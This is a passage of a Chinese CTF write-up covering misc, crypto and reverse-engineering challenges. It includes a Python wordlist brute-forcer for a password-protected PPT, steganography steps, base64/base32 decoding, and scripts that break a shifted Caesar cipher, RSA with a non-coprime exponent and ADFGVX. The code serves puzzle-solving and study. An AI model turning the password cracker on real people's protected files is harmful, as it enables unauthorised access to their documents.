class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 爆破</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> win32com.client</span><br><span class=\"line\"><span class=\"keyword\">import</span> pywintypes</span><br><span class=\"line\">passw=[]</span><br><span class=\"line\">dic = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;pass1.txt&quot;</span>,<span class=\"string\">&quot;r&quot;</span>)</span><br><span class=\"line\">data=dic.readline().strip(<span class=\"string\">&#x27;\\n&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">while</span> data:</span><br><span class=\"line\">    passw.append(data);</span><br><span class=\"line\">    data=dic.readline().strip(<span class=\"string\">&#x27;\\n&#x27;</span>);</span><br><span class=\"line\">dic.close();</span><br><span class=\"line\">wps1=win32com.client.Dispatch(<span class=\"string\">&#x27;Kwps.application&#x27;</span>)</span><br><span class=\"line\">wps1.Visible=<span class=\"literal\">True</span></span><br><span class=\"line\">wps1.DisplayAlerts = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> passw:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        d=wps1.Documents.Open(<span class=\"string\">r&#x27;C:\\Users\\Sycamore\\Desktop\\CTF\\flag去哪了.ppt&#x27;</span>,PasswordDocument=i);</span><br><span class=\"line\">    <span class=\"keyword\">except</span> pywintypes.com_error:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;succcccceesss&quot;</span>+i)</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"misc2\"><a class=\"anchor\" href=\"#misc2\">#</a> misc2</h3>\n<p>binwalk 分离，得到了很多文件，依次打开，查看文件内容，<br />\n其中一个文件：3BD12，<br />\n打开后获得一串 base64：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444751/Typera/2023/04/768eee297663a9e32fc4fc496cac6f97.png\" alt=\"image-20230426014548136\" /></p>\n<p>两次 base64 解码后，就能得到 flag</p>\n<h3 id=\"misc3\"><a class=\"anchor\" href=\"#misc3\">#</a> misc3</h3>\n<p>打开听了一下，感觉像 SSTV（今年 Misc 考这个的还真不少...），<br />\n安卓端使用 robot36 解码，<br />\n获得图片如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444746/Typera/2023/04/f51ed89d71155cbcda0bfc8f6e732d98.png\" alt=\"image-20230426014542237\" /></p>\n<h3 id=\"misc4\"><a class=\"anchor\" href=\"#misc4\">#</a> misc4</h3>\n<p>010 打开后文件末尾看到提示为：lsb<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444738/Typera/2023/04/a0b423aba3dce71da97e7ff584b46211.png\" alt=\"image-20230426014535850\" /></p>\n<p>stegsolve 打开后查看通道，发现 R G B 的 0 通道都有异常，<br />\n提取数据得到一张 jfif 图片如下，<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444733/Typera/2023/04/1f50a00f8fc8a07fc7bab3299c06a3cd.png\" alt=\"image-20230426014529631\" /></p>\n<p>010 打开新图片，发现文件中间的 base64，解码得到 flag<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444726/Typera/2023/04/6a15b005d94435c94b76898f2f6b43c5.png\" alt=\"image-20230426014522816\" /></p>\n<h2 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> CRYPTO</h2>\n<h3 id=\"crypto1\"><a class=\"anchor\" href=\"#crypto1\">#</a> Crypto1</h3>\n<p>观察其结构为 base 系列加密</p>\n<p>base64 解密后得到密文 K5WTCNDBIZXXUZCHGFHWC22VO5LVO4CDMFCTCNSVKRHGCUSHJV5FI22SJNQUM4CIKJKFET2SGFVXUV2WMRHGKVTMLBJVIQSOMFVVK6CUGBTXOUCRHU6Q====，base64 最多有两个 = 号并且其全为大写，故是 base32 编码，之后又经过两层 base64 解码。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444666/Typera/2023/04/cdefdc67d556d6eab98241c52fffe5c3.png\" alt=\"image-20220608110331959\" /></p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\">c=<span class=\"string\">&#x27;SzVXVENOREJJWlhYVVpDSEdGSFdDMjJWTzVMVk80Q0RNRkNUQ05TVktSSEdDVVNISlY1RkkyMlNKTlFVTTRDSUtKS0ZFVDJTR0ZWWFVWMldNUkhHS1ZUTUxCSlZJUVNPTUZWVks2Q1VHQlRYT1VDUkhVNlE9PT09&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(base64.b64decode(c))</span><br><span class=\"line\">c1=<span class=\"string\">&#x27;K5WTCNDBIZXXUZCHGFHWC22VO5LVO4CDMFCTCNSVKRHGCUSHJV5FI22SJNQUM4CIKJKFET2SGFVXUV2WMRHGKVTMLBJVIQSOMFVVK6CUGBTXOUCRHU6Q====&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(base64.b32decode(c1))</span><br><span class=\"line\">c2=<span class=\"string\">&#x27;Wm14aFozdG1OakUwWWpCaE16UTNaRGMzTkRKaFpHRTROR1kzWVdNeVlXSTBNakUxT0gwPQ==&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(base64.b64decode(c2))</span><br><span class=\"line\">c3=<span class=\"string\">&#x27;ZmxhZ3tmNjE0YjBhMzQ3ZDc3NDJhZGE4NGY3YWMyYWI0MjE1OH0=&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(base64.b64decode(c3))</span><br><span class=\"line\"><span class=\"comment\">#flag&#123;f614b0a347d7742ada84f7ac2ab42158&#125;</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"crypto2\"><a class=\"anchor\" href=\"#crypto2\">#</a> Crypto2</h3>\n<p>首先题目提示凯撒加密，但是其中有 +、(、? 等特殊字符，尝试 26 以内的偏移，或和 flag {和 Zmxh (flag 的 base64 编码) 算移位没有发现规律。</p>\n<p>尝试在 0-128 内唯一，打印其中可显示的明文字符串。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s=<span class=\"string\">b&#x27;Nd(+X=fqZqEEM&lt;bpKegNYMg?NdkEDcAkKLIaEL(LHdcFM\\&#x27;c*Nc[QEMchP*gFM=c-NM^n&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">128</span>):</span><br><span class=\"line\">    m=[]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(s)):</span><br><span class=\"line\">        m.append((s[j]-i)%<span class=\"number\">128</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;shfit: %d&#x27;</span>%i,<span class=\"built_in\">bytes</span>(m).decode())</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>打印结果如下</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/95583e673986ca8fb15a052c62d8b6d8.png\" alt=\"image-20220608110941375\" /></p>\n<p>在 shfit 的偏移为 119 时发现一个可疑的明文信息，尝试 base64 解密。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/c1f50a879e27e33a64a8e8f5b722b870.png\" alt=\"image-20220608111119812\" /></p>\n<p>发现两次解密后即为 flag，完整代码如下。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">s=<span class=\"string\">b&#x27;Nd(+X=fqZqEEM&lt;bpKegNYMg?NdkEDcAkKLIaEL(LHdcFM\\&#x27;c*Nc[QEMchP*gFM=c-NM^n&#x27;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">for i in range(128):</span></span><br><span class=\"line\"><span class=\"string\">    m=[]</span></span><br><span class=\"line\"><span class=\"string\">    for j in range(len(s)):</span></span><br><span class=\"line\"><span class=\"string\">        m.append((s[j]-i)%128)</span></span><br><span class=\"line\"><span class=\"string\">    print(&#x27;shfit: %d&#x27;%i,bytes(m).decode())</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(base64.b64decode(<span class=\"string\">&#x27;Wm14aFozczNNVEkyTnpWbVpHWmtNMlJtTURjNU1UQmlOV0l3WldZNVlqY3pOVFl6WVgw&#x27;</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(base64.b64decode(<span class=\"string\">&#x27;ZmxhZ3s3MTI2NzVmZGZkM2RmMDc5MTBiNWIwZWY5YjczNTYzYX0=&#x27;</span>))</span><br><span class=\"line\">m=<span class=\"string\">&#x27;flag&#123;712675fdfd3df07910b5b0ef9b73563a&#125;&#x27;</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"crypto3\"><a class=\"anchor\" href=\"#crypto3\">#</a> Crypto3</h3>\n<p>RSA 公钥加密，题目附件中包括 c、n、e，但是 e 比较小且是偶数，故考察方向为 e 和 phin 不互素，尝试用 yafu 分解 n。</p>\n<p>等待一段时间后 n 被成功分解，如下图。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/11e61701c1ca00d8a3f8593f77dadbf6.png\" alt=\"image-20220608111541593\" /></p>\n<p>得到 p 和 q 后就可以求私钥，但是 (e,phi)=4, 故无逆元，那么根据 m^e mod n 可以变为 (m<sup>4)</sup>(e/4) 这样 e/4 和 phi 便互素，但是这样 c^d mod n 后得到的为 m^4 mod n，直接用 iroot 尝试开 4 次方，最后转为字符即发现 flag。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\">n = <span class=\"number\">22418636922065508104264650472638100390507346675022700253583060418349386472260539292033574216754214047540225287240029292436219548116787251605020424767984000804727346173028308816952737183433110999995264950414364145519999339949396799207404153148796900954086093431917244453864253649011176295266497073733547832171165497506613139960587280135867463235266546869960044777350378595302570142110464582590415694749192915651700844268466357439219626769665355230647219887042871785185100743750953935872489085346311527806979246650668966304323450610041756764667276881295676841136337294903126776228640645138477063815764467811948872156311</span></span><br><span class=\"line\">e = <span class=\"number\">180</span></span><br><span class=\"line\">c = <span class=\"number\">17971123746814947059314270113966290245749007752378241906733564181493060407114219968936077930494933520528427074831694818994710527963410153282657079091353179846750982127804195747725871635911272654572811618799762595633801414107052800867035212498914627567940429340162711284873714117628807667324064684965941290688518710890089086623981356782977499005308798890348799101436318386502089586589964942282091818134339082321114129830959264557408611168516265190076744300272908807347811446203373025446057616713876047942653095947804696077860211107853183353180163392501353685418796451123620066941329424857070023018877454625734091037559</span></span><br><span class=\"line\">p=<span class=\"number\">149728544112555599590936673615696271318636529352637830106348687941183054498250042553549708433208468004536400117026086238076264785396396599290721801532887662723160698502186620809003309343021490868380464762486274154096814166441270611631342173101926176645742035350917214925625954628200341278782929951624259583527</span></span><br><span class=\"line\">q=<span class=\"number\">149728544112555599590936673615696271318636529352637830106348687941183054498250042553549708433208468004536400117026086238076264785396396599290721801532887662723160698502186620809003309343021490868380464762486274154096814166441270611631342173101926176645742035350917214925625954628200341278782929951624259582993</span></span><br><span class=\"line\">phi=(p-<span class=\"number\">1</span>)*(q-<span class=\"number\">1</span>)</span><br><span class=\"line\">e=e//gmpy2.gcd(e,phi)</span><br><span class=\"line\">d=gmpy2.invert(e,phi)</span><br><span class=\"line\">m4=<span class=\"built_in\">pow</span>(c,d,n)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(long_to_bytes(gmpy2.iroot(m4,<span class=\"number\">4</span>)[<span class=\"number\">0</span>]))</span><br><span class=\"line\"><span class=\"comment\">#flag&#123;09dfc77eaebb50f136fc184533b9d556&#125;</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"crypto4\"><a class=\"anchor\" href=\"#crypto4\">#</a> Crypto4</h3>\n<p>拿到附件发现是自己实现的 ADFGVX 加密，key 已知是 ph0qg64mea1yl2nofdxkr3cvs5zw7bj9uti8，但是 keyword 未知。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getKeyword</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    key = <span class=\"string\">&#x27;&#x27;</span>.join([choice(<span class=\"string\">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(x)])</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> key:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> key.count(i)!=<span class=\"number\">1</span>: <span class=\"comment\">#只有一种</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> getKeyword(x)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> key</span><br><span class=\"line\">keyword = getKeyword(<span class=\"number\">7</span>)</span><br></pre></td></tr></table></figure></p>\n<p>根据关键字的生成算法可知是在字母表中选取 7 个不同的字符，如果要爆破则有 26*25*24*23*22*21*20=3315312000 组合，在比赛时间内应该不行，故要根据 ADFGVX 原理来解决该题。</p>\n<p>百度得知加密步骤如下。</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/015954e81f3f5c183a376d48e8cebdf3.png\" alt=\"image-20220608114533949\" /></p>\n<p>上图是 5X5 的 ADFGX 而本题是 ADFGVX 是前者的进阶版本，所以 key 是 6x6 的矩阵，并且置换之后通过 key 来进行移位加密。</p>\n<p>得知原理后继续看脚本</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encipher_char</span>(<span class=\"params\">self, ch, size=<span class=\"number\">6</span>, chars=<span class=\"string\">&#x27;ADFGVX&#x27;</span></span>):</span><br><span class=\"line\">    row = (<span class=\"built_in\">int</span>)(self.key.index(ch)/size) <span class=\"comment\">#第几行</span></span><br><span class=\"line\">    col = (self.key.index(ch) % size)    <span class=\"comment\">#第几列</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> chars[row] + chars[col]  <span class=\"comment\">#行列替换      </span></span><br></pre></td></tr></table></figure></p>\n<p>所以我们打印出表格如下</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">k=<span class=\"string\">&#x27;ph0qg64mea1yl2nofdxkr3cvs5zw7bj9uti8&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(k),<span class=\"number\">6</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(k[i+j].upper(),end=<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">   A D F G V X </span></span><br><span class=\"line\"><span class=\"string\">A  P H 0 Q G 6 </span></span><br><span class=\"line\"><span class=\"string\">D  4 M E A 1 Y </span></span><br><span class=\"line\"><span class=\"string\">F  L 2 N O F D </span></span><br><span class=\"line\"><span class=\"string\">G  X K R 3 C V </span></span><br><span class=\"line\"><span class=\"string\">V  S 5 Z W 7 B </span></span><br><span class=\"line\"><span class=\"string\">X  J 9 U T I 8 </span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></p>\n<p>但是直接解密是错的的并没有体现到 key 的作用，观察源码，发现 key 有处理。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">step1 = self.encipher_string(string) <span class=\"comment\">#简单置换后的结果</span></span><br><span class=\"line\">step2 = self.encipher_sortind(step1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sortind</span>(<span class=\"params\">word</span>): <span class=\"comment\">#返回key字母在排序后的字母中的位置</span></span><br><span class=\"line\">    t1 = [(word[i], i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(word))]</span><br><span class=\"line\">    t2 = [(k[<span class=\"number\">1</span>], i) <span class=\"keyword\">for</span> i, k <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(<span class=\"built_in\">sorted</span>(t1))]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [q[<span class=\"number\">1</span>] <span class=\"keyword\">for</span> q <span class=\"keyword\">in</span> <span class=\"built_in\">sorted</span>(t2)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encipher_sortind</span>(<span class=\"params\">self,string</span>):</span><br><span class=\"line\">     string = self.remove_punctuation(string)    </span><br><span class=\"line\">     ret = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">     ind = self.sortind(self.keyword)   </span><br><span class=\"line\">     <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(self.keyword)): </span><br><span class=\"line\">          ret += string[ind.index(i)::<span class=\"built_in\">len</span>(self.keyword)] <span class=\"comment\">#取出某一列拼出来</span></span><br><span class=\"line\">     <span class=\"keyword\">return</span> ret</span><br></pre></td></tr></table></figure></p>\n<p>可以手动测试</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/2dcc4036c7d355c33b91d57185d4293f.png\" alt=\"image-20220608125424031\" /></p>\n<p>这样的话这个 ind 可以被爆破，因为 keyword 长度为 7 那么 ind 的排序为 7*6*5*4*3*2 = 5040 种可能，并且其中移位置换后解密不能出现数字或相同字母，爆破即可，解密脚本如下。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pycipher <span class=\"keyword\">import</span> ADFGVX</span><br><span class=\"line\"><span class=\"keyword\">from</span> itertools <span class=\"keyword\">import</span> permutations</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decipher_pair</span>(<span class=\"params\">pair, key=<span class=\"string\">&#x27;ph0qg64mea1yl2nofdxkr3cvs5zw7bj9uti8&#x27;</span>, size=<span class=\"number\">6</span>, chars=<span class=\"string\">&#x27;ADFGVX&#x27;</span></span>): <span class=\"comment\">#反求key</span></span><br><span class=\"line\">    row = chars.index(pair[<span class=\"number\">0</span>])</span><br><span class=\"line\">    col = chars.index(pair[<span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> key[row * size + col]</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decipher_str</span>(<span class=\"params\">string</span>):</span><br><span class=\"line\">    ret = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(string), <span class=\"number\">2</span>):</span><br><span class=\"line\">        ret += decipher_pair(string[i:i + <span class=\"number\">2</span>])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check</span>(<span class=\"params\">s</span>): <span class=\"comment\">#优化爆破 即解密的key要在小写字母表内 且 无数字</span></span><br><span class=\"line\">    num_lst = [<span class=\"string\">&#x27;AF&#x27;</span>, <span class=\"string\">&#x27;AX&#x27;</span>, <span class=\"string\">&#x27;DA&#x27;</span>, <span class=\"string\">&#x27;DV&#x27;</span>, <span class=\"string\">&#x27;FD&#x27;</span>, <span class=\"string\">&#x27;GG&#x27;</span>, <span class=\"string\">&#x27;VD&#x27;</span>, <span class=\"string\">&#x27;VV&#x27;</span>, <span class=\"string\">&#x27;XD&#x27;</span>, <span class=\"string\">&#x27;XX&#x27;</span>] <span class=\"comment\">#剔除数字</span></span><br><span class=\"line\">    <span class=\"built_in\">all</span> = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">        t = s[i * <span class=\"number\">2</span>] + s[i * <span class=\"number\">2</span> + <span class=\"number\">1</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (t <span class=\"keyword\">in</span> num_lst):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (t <span class=\"keyword\">in</span> <span class=\"built_in\">all</span>):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"built_in\">all</span>.append(t)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">kenc = <span class=\"string\">&#x27;XAGDFGVGXXXGAX&#x27;</span></span><br><span class=\"line\">flag = <span class=\"string\">&#x27;DXVGGVGGVGVFXAFVFXFFXFVFFFVFDVVGADGVAVGDAAVXGDGXGXDFVFDAVADAXAAFFVFXXGVX&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">r1 = [kenc[i] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(kenc), <span class=\"number\">2</span>)] <span class=\"comment\">#明文中第一行</span></span><br><span class=\"line\">r2 = [kenc[i] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"built_in\">len</span>(kenc), <span class=\"number\">2</span>)] <span class=\"comment\">#明文中第二行</span></span><br><span class=\"line\"></span><br><span class=\"line\">all_list = <span class=\"built_in\">list</span>(permutations([<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>], <span class=\"number\">7</span>)) <span class=\"comment\">#暴力枚举所有状态</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> it <span class=\"keyword\">in</span> all_list:</span><br><span class=\"line\">    c = [r1[i] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> it] + [r2[i] <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> it] <span class=\"comment\">#连续两个为r1和r2行中的元素 且置换回去</span></span><br><span class=\"line\">    d = <span class=\"string\">&#x27;&#x27;</span>.join(c)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> check(c):</span><br><span class=\"line\">        kd = decipher_str(d)</span><br><span class=\"line\">        enc = ADFGVX(<span class=\"string\">&#x27;ph0qg64mea1yl2nofdxkr3cvs5zw7bj9uti8&#x27;</span>, kd)</span><br><span class=\"line\">        ed = enc.encipher(kd)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ed == kenc:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(kd,it)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(enc.decipher(flag).lower())</span><br><span class=\"line\"><span class=\"comment\">#flag&#123;fb0dd5203c02cf7c60dc99330b5bfa66&#125;</span></span><br></pre></td></tr></table></figure><br />\nADFGVX 参考链接: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2V1emVuL2FydGljbGUvZGV0YWlscy8xMTkwODUzNTA=\">https://blog.csdn.net/euzen/article/details/119085350</span></p>\n<h2 id=\"re\"><a class=\"anchor\" href=\"#re\">#</a> RE</h2>\n<h3 id=\"re1\"><a class=\"anchor\" href=\"#re1\">#</a> RE1</h3>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682444667/Typera/2023/04/7c2d39d2c6227afa277042cf00152b28.png\" alt=\"image-20220608101847626\" /></p>\n<p>GO 语言逆向题，flag 直接和输入比对，可以在 main_mian 函数的窗口看到 flag，或 string+F12 搜索 flag 即可。</p>\n<p 02f4fd5497119e238350002c5dbe1341=\"\">flag</p>\n<h3 id=\"re2\"><a class=\"anchor\" href=\"#re2\">#</a> 